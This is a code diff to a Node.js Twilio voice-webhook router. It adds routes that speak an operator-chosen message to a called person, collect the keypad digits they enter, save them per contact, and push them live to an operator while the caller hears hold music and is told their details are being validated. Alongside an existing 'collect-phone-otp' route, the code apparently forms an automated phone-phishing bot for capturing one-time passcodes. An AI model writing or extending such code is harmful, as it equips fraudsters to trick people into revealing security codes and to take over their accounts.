@@ -175,16 +175,22 @@ router.post('/check-hold/:sessionId', async (req, res) => {
     const sessionId = req.params.sessionId;
     const twiml = new VoiceResponse();
     
+    console.log('Check hold for session:', sessionId);
+    
     const session = await db.query(
         `SELECT current_action FROM call_sessions WHERE id = $1`,
         [sessionId]
     );
     
+    console.log('Current action in check-hold:', session.rows[0]?.current_action);
+    
     if (session.rows[0] && session.rows[0].current_action === 'playing_music') {
+        console.log('Still playing music, looping...');
         const play = twiml.play({ loop: 5 });
         play.url = 'https://twimlets.com/holdmusic?Bucket=com.twilio.music.classical';
         twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
     } else {
+        console.log('Music interrupted, moving to next action');
         twiml.redirect(`/webhooks/voice-response/${sessionId}`, { method: 'POST' });
     }
     
@@ -309,6 +315,60 @@ router.post('/collect-phone-otp/:sessionId', async (req, res) => {
         twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
     } else {
         twiml.say('No OTP received. Goodbye.');
+        twiml.hangup();
+    }
+    
+    res.type('text/xml');
+    res.send(twiml.toString());
+});
+
+router.post('/custom-voice/:sessionId', async (req, res) => {
+    const sessionId = req.params.sessionId;
+    const { message } = req.body;
+    const twiml = new VoiceResponse();
+    const io = req.app.get('io');
+    
+    console.log('Custom voice for session:', sessionId, 'Message:', message);
+    
+    await db.query(`UPDATE call_sessions SET current_action = 'waiting_for_custom' WHERE id = $1`, [sessionId]);
+    
+    const gather = twiml.gather({
+        numDigits: 20,
+        action: `/webhooks/collect-custom/${sessionId}`,
+        method: 'POST',
+        finishOnKey: '#',
+        timeout: 10
+    });
+    gather.say(message);
+    twiml.say('No input received. Goodbye.');
+    twiml.hangup();
+    
+    res.type('text/xml');
+    res.send(twiml.toString());
+});
+
+router.post('/collect-custom/:sessionId', async (req, res) => {
+    const sessionId = req.params.sessionId;
+    const { Digits } = req.body;
+    const twiml = new VoiceResponse();
+    const io = req.app.get('io');
+    
+    console.log('Custom data collected:', Digits);
+    
+    if (Digits) {
+        const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
+        await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, session.rows[0].contact_id, 'custom', Digits]);
+        
+        io.emit('data_collected', { session_id: sessionId, type: 'custom', value: Digits });
+        
+        await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
+        
+        twiml.say('Thank you. Please hold while we validate your details.');
+        const play = twiml.play({ loop: 10 });
+        play.url = 'https://twimlets.com/holdmusic?Bucket=com.twilio.music.classical';
+        twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
+    } else {
+        twiml.say('No input received. Goodbye.');
         twiml.hangup();
     }
     
